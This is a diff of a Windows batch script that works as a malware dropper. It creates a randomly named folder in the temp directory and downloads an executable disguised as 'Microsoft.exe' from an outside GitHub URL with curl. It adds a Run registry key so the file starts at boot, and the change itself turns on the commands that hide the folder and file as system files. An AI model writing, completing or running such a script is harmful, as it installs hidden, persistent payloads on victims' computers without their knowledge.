@@ -26,7 +26,7 @@ set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
 mkdir "%hiddenFolder2%"
 
 REM Set hidden attribute for folder
-rem attrib +h +s "%hiddenFolder2%"
+attrib +h +s "%hiddenFolder2%"
 
 cd "%hiddenFolder2%"
 
@@ -118,7 +118,7 @@ REM Download payload files to hidden folder using curl
 curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
 
 REM Set hidden attribute for files
-rem attrib +h +s "%hiddenFolder2%\Microsoft.exe"
+attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 
 REM Add registry key to start Microsoft.exe on boot
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
